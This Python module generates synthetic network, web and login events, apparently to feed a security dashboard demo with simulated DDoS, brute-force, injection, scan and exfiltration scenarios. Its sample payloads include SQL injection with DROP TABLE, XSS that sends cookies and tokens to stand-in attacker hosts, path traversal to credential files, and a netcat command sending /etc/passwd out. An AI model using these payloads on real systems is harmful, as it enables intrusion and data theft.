import random
import time
from datetime import datetime
from typing import Dict, Any, List

# Geolocation database for rich visual attack maps
GEO_LOCATIONS = [
    {"country": "United States", "city": "Ashburn", "lat": 39.0438, "lng": -77.4874, "flag": "🇺🇸"},
    {"country": "Russia", "city": "Moscow", "lat": 55.7558, "lng": 37.6173, "flag": "🇷🇺"},
    {"country": "China", "city": "Shanghai", "lat": 31.2304, "lng": 121.4737, "flag": "🇨🇳"},
    {"country": "Germany", "city": "Frankfurt", "lat": 50.1109, "lng": 8.6821, "flag": "🇩🇪"},
    {"country": "North Korea", "city": "Pyongyang", "lat": 39.0392, "lng": 125.7625, "flag": "🇰🇵"},
    {"country": "Iran", "city": "Tehran", "lat": 35.6892, "lng": 51.3890, "flag": "🇮🇷"},
    {"country": "Brazil", "city": "Sao Paulo", "lat": -23.5505, "lng": -46.6333, "flag": "🇧🇷"},
    {"country": "Romania", "city": "Bucharest", "lat": 44.4268, "lng": 26.1025, "flag": "🇷🇴"},
    {"country": "India", "city": "Bengaluru", "lat": 12.9716, "lng": 77.5946, "flag": "🇮🇳"},
    {"country": "United Kingdom", "city": "London", "lat": 51.5074, "lng": -0.1278, "flag": "🇬🇧"},
    {"country": "Netherlands", "city": "Amsterdam", "lat": 52.3676, "lng": 4.9041, "flag": "🇳🇱"},
    {"country": "Japan", "city": "Tokyo", "lat": 35.6762, "lng": 139.6503, "flag": "🇯🇵"}
]

# Protected Core Data Center
SERVER_LOCATION = {"city": "CyberGuard SOC HQ", "lat": 37.7749, "lng": -122.4194} # San Francisco

USERNAMES = ["admin", "root", "ubuntu", "system", "postgres", "guest", "db_admin", "devesh", "sec_ops", "jenkins"]

BENIGN_URLS = [
    "/api/v1/telemetry?node=core-01",
    "/dashboard/metrics?period=1h",
    "/auth/session/verify",
    "/static/img/soc_shield.svg",
    "/api/v2/cluster/healthcheck",
    "/users/profile?id=4921",
    "/catalog/items?category=cloud_sec"
]

class AttackSimulator:
    """Generates continuous live background traffic and creates on-demand attack scenarios."""
    
    def generate_random_ip(self, country: str = None) -> str:
        octets = [random.randint(45, 220), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254)]
        return ".".join(map(str, octets))

    def generate_normal_event(self) -> Dict[str, Any]:
        """Generates legitimate benign background network/web/auth event."""
        geo = random.choice([g for g in GEO_LOCATIONS if g["country"] in ["United States", "Germany", "United Kingdom", "India", "Netherlands", "Japan"]])
        event_type = random.choice(["network_flow", "web_request", "auth_log"])
        
        src_ip = self.generate_random_ip()
        now = datetime.utcnow().isoformat() + "Z"
        
        if event_type == "web_request":
            return {
                "id": f"EVT-{random.randint(100000, 999999)}",
                "timestamp": now,
                "event_type": "web_request",
                "src_ip": src_ip,
                "src_country": geo["country"],
                "city": geo["city"],
                "geo_lat": geo["lat"],
                "geo_lng": geo["lng"],
                "dst_ip": "10.0.0.1",
                "method": random.choice(["GET", "POST", "PUT"]),
                "url": random.choice(BENIGN_URLS),
                "payload": random.choice(BENIGN_URLS),
                "response_code": 200,
                "packets_per_sec": random.uniform(15, 60),
                "bytes_per_sec": random.uniform(5000, 45000)
            }
        elif event_type == "auth_log":
            return {
                "id": f"EVT-{random.randint(100000, 999999)}",
                "timestamp": now,
                "event_type": "auth_log",
                "src_ip": src_ip,
                "src_country": geo["country"],
                "city": geo["city"],
                "geo_lat": geo["lat"],
                "geo_lng": geo["lng"],
                "dst_ip": "10.0.0.1",
                "username": random.choice(USERNAMES),
                "failed_logins": random.choice([0, 0, 0, 1]),
                "time_window_sec": 60,
                "is_known_device": True
            }
        else:
            return {
                "id": f"EVT-{random.randint(100000, 999999)}",
                "timestamp": now,
                "event_type": "network_flow",
                "src_ip": src_ip,
                "src_country": geo["country"],
                "city": geo["city"],
                "geo_lat": geo["lat"],
                "geo_lng": geo["lng"],
                "dst_ip": "10.0.0.1",
                "dst_port": random.choice([80, 443, 8080, 22]),
                "packets_per_sec": random.uniform(20, 110),
                "bytes_per_sec": random.uniform(12000, 85000),
                "syn_ratio": random.uniform(0.02, 0.12),
                "unique_dst_ports": random.choice([1, 2]),
                "flow_duration": random.uniform(1.0, 15.0),
                "packet_entropy": random.uniform(0.3, 0.55)
            }

    def create_attack_scenario(self, attack_type: str) -> List[Dict[str, Any]]:
        """Generates a surge burst of events simulating a specific attack scenario."""
        attack_type = attack_type.lower()
        now = datetime.utcnow().isoformat() + "Z"
        events = []

        if attack_type in ["ddos", "dos"]:
            # Volumetric Flood from botnet swarm
            botnet_origins = random.sample(GEO_LOCATIONS, k=5)
            for i in range(12):
                geo = random.choice(botnet_origins)
                events.append({
                    "id": f"ATK-DDoS-{random.randint(10000, 99999)}",
                    "timestamp": now,
                    "event_type": "network_flow",
                    "src_ip": self.generate_random_ip(),
                    "src_country": geo["country"],
                    "city": geo["city"],
                    "geo_lat": geo["lat"],
                    "geo_lng": geo["lng"],
                    "dst_ip": "10.0.0.1",
                    "dst_port": 80,
                    "packets_per_sec": random.uniform(4500, 9500),
                    "bytes_per_sec": random.uniform(6_500_000, 15_000_000),
                    "syn_ratio": random.uniform(0.85, 0.99),
                    "unique_dst_ports": 1,
                    "flow_duration": random.uniform(0.2, 1.2),
                    "packet_entropy": random.uniform(0.12, 0.28)
                })

        elif attack_type in ["brute_force", "bruteforce", "ssh"]:
            # High-velocity dictionary attack on admin/root
            geo = random.choice([g for g in GEO_LOCATIONS if g["country"] in ["Russia", "China", "North Korea", "Iran", "Romania"]])
            attacker_ip = self.generate_random_ip()
            target_user = random.choice(["root", "admin", "postgres"])
            for attempt in range(6):
                events.append({
                    "id": f"ATK-BF-{random.randint(10000, 99999)}",
                    "timestamp": now,
                    "event_type": "auth_log",
                    "src_ip": attacker_ip,
                    "src_country": geo["country"],
                    "city": geo["city"],
                    "geo_lat": geo["lat"],
                    "geo_lng": geo["lng"],
                    "dst_ip": "10.0.0.1",
                    "username": target_user,
                    "failed_logins": random.randint(22, 65),
                    "time_window_sec": 15,
                    "is_known_device": False,
                    "service": "SSH-2.0-OpenSSH_8.2"
                })

        elif attack_type in ["sqli", "sql_injection"]:
            geo = random.choice(GEO_LOCATIONS)
            attacker_ip = self.generate_random_ip()
            sqli_samples = [
                "' UNION SELECT id, username, password_hash, token FROM auth_users --",
                "admin' OR 1=1 --",
                "1; DROP TABLE telemetry_logs; --",
                "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), 0x3a, user()) x FROM information_schema.tables GROUP BY x) a) --"
            ]
            for p in sqli_samples:
                events.append({
                    "id": f"ATK-SQLI-{random.randint(10000, 99999)}",
                    "timestamp": now,
                    "event_type": "web_request",
                    "src_ip": attacker_ip,
                    "src_country": geo["country"],
                    "city": geo["city"],
                    "geo_lat": geo["lat"],
                    "geo_lng": geo["lng"],
                    "dst_ip": "10.0.0.1",
                    "method": "POST",
                    "url": "/api/v1/auth/login",
                    "payload": f"username={p}&password=secret",
                    "response_code": 500
                })

        elif attack_type in ["xss", "cross_site_scripting"]:
            geo = random.choice(GEO_LOCATIONS)
            attacker_ip = self.generate_random_ip()
            xss_samples = [
                "<script>fetch('https://c2-evil-attacker.ru/collect?c='+document.cookie)</script>",
                "<img src=x onerror=\"alert('XSS_EXECUTION_SUCCESS')\">",
                "<svg onload=\"window.location='http://stealer.net/?k='+localStorage.getItem('token')\">"
            ]
            for p in xss_samples:
                events.append({
                    "id": f"ATK-XSS-{random.randint(10000, 99999)}",
                    "timestamp": now,
                    "event_type": "web_request",
                    "src_ip": attacker_ip,
                    "src_country": geo["country"],
                    "city": geo["city"],
                    "geo_lat": geo["lat"],
                    "geo_lng": geo["lng"],
                    "dst_ip": "10.0.0.1",
                    "method": "POST",
                    "url": "/comments/post?thread_id=98",
                    "payload": f"comment={p}&author=anonymous",
                    "response_code": 200
                })

        elif attack_type in ["port_scan", "nmap"]:
            geo = random.choice(GEO_LOCATIONS)
            attacker_ip = self.generate_random_ip()
            for _ in range(4):
                events.append({
                    "id": f"ATK-SCAN-{random.randint(10000, 99999)}",
                    "timestamp": now,
                    "event_type": "network_flow",
                    "src_ip": attacker_ip,
                    "src_country": geo["country"],
                    "city": geo["city"],
                    "geo_lat": geo["lat"],
                    "geo_lng": geo["lng"],
                    "dst_ip": "10.0.0.1",
                    "dst_port": random.randint(20, 8080),
                    "packets_per_sec": random.uniform(320, 680),
                    "bytes_per_sec": random.uniform(25000, 60000),
                    "syn_ratio": random.uniform(0.88, 0.98),
                    "unique_dst_ports": random.randint(45, 120),
                    "flow_duration": random.uniform(0.5, 1.8),
                    "packet_entropy": random.uniform(0.40, 0.58)
                })

        elif attack_type in ["path_traversal", "traversal"]:
            geo = random.choice(GEO_LOCATIONS)
            attacker_ip = self.generate_random_ip()
            samples = [
                "../../../../../../etc/passwd",
                "..%2f..%2f..%2fetc%2fshadow",
                "c:\\windows\\system32\\config\\sam"
            ]
            for p in samples:
                events.append({
                    "id": f"ATK-TRAV-{random.randint(10000, 99999)}",
                    "timestamp": now,
                    "event_type": "web_request",
                    "src_ip": attacker_ip,
                    "src_country": geo["country"],
                    "city": geo["city"],
                    "geo_lat": geo["lat"],
                    "geo_lng": geo["lng"],
                    "dst_ip": "10.0.0.1",
                    "method": "GET",
                    "url": f"/download?file={p}",
                    "payload": f"file={p}",
                    "response_code": 403
                })

        elif attack_type in ["cmd_injection", "rce"]:
            geo = random.choice(GEO_LOCATIONS)
            attacker_ip = self.generate_random_ip()
            samples = [
                "; cat /etc/passwd | nc 198.51.100.4 4444",
                "& powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...",
                "| whoami && id && uname -a"
            ]
            for p in samples:
                events.append({
                    "id": f"ATK-RCE-{random.randint(10000, 99999)}",
                    "timestamp": now,
                    "event_type": "web_request",
                    "src_ip": attacker_ip,
                    "src_country": geo["country"],
                    "city": geo["city"],
                    "geo_lat": geo["lat"],
                    "geo_lng": geo["lng"],
                    "dst_ip": "10.0.0.1",
                    "method": "POST",
                    "url": "/tools/ping_host",
                    "payload": f"host=127.0.0.1{p}",
                    "response_code": 200
                })

        elif attack_type in ["data_exfil", "exfiltration"]:
            geo = random.choice([g for g in GEO_LOCATIONS if g["country"] in ["Russia", "China", "Romania", "North Korea"]])
            attacker_ip = self.generate_random_ip()
            events.append({
                "id": f"ATK-EXFIL-{random.randint(10000, 99999)}",
                "timestamp": now,
                "event_type": "network_flow",
                "src_ip": "10.0.0.45", # Compromised internal node
                "dst_ip": attacker_ip,
                "src_country": "United States",
                "country": geo["country"],
                "city": geo["city"],
                "geo_lat": geo["lat"],
                "geo_lng": geo["lng"],
                "dst_port": 4444,
                "packets_per_sec": 650,
                "bytes_per_sec": 18_500_000, # 18.5 MB/s outbound
                "syn_ratio": 0.04,
                "unique_dst_ports": 1,
                "flow_duration": 35.0,
                "packet_entropy": 0.96
            })

        else: # Zero-Day Anomaly
            geo = random.choice(GEO_LOCATIONS)
            attacker_ip = self.generate_random_ip()
            events.append({
                "id": f"ATK-ZDAY-{random.randint(10000, 99999)}",
                "timestamp": now,
                "event_type": "network_flow",
                "src_ip": attacker_ip,
                "src_country": geo["country"],
                "city": geo["city"],
                "geo_lat": geo["lat"],
                "geo_lng": geo["lng"],
                "dst_ip": "10.0.0.1",
                "dst_port": 61234,
                "packets_per_sec": 1850,
                "bytes_per_sec": 4_200_000,
                "syn_ratio": 0.42,
                "unique_dst_ports": 7,
                "flow_duration": 4.5,
                "packet_entropy": 0.88
            })

        return events

simulator = AttackSimulator()
